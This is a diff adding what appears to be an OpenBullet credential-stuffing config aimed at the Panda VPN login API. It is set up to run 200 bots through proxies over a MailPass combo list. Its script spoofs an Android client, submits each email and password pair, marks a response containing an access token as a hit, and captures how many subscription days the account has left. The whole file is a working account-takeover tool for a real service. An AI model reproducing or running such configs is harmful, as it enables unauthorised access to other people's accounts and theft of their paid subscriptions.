@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "Name": "Panda VPN",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-27T04:52:35.9976537+02:00",
+  "AdditionalInfo": "",
+  "Author": "r37z",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.pandabear.pw/api/users/app/login" 
+  CONTENT "{\"account\":\"<USER>\",\"clientVersion\":\"1.4.0\",\"deviceName\":\"Android 5.1.1 SDK 22 samsung SM-N950N\",\"deviceToken\":\"C3D917AA9603367E388DCD3E4A3E3A59\",\"deviceType\":\"ANDROID\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "accept: application/json" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "api-version: v1.0" 
+  HEADER "device-identifier: C3D917AA9603367E388DCD3E4A3E3A59" 
+  HEADER "product-identifier: panda" 
+  HEADER "Content-Type: application/json; charset=UTF-8" 
+  HEADER "Content-Length: 213" 
+  HEADER "Host: api.pandabear.pw" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "User-Agent: okhttp/3.8.0" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "004" 
+    KEY "003" 
+  KEYCHAIN Success OR 
+    KEY "accessToken" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "EXPIRED" 
+
+PARSE "<SOURCE>" JSON "leftDays" -> CAP "Day's left to expire : " 
+
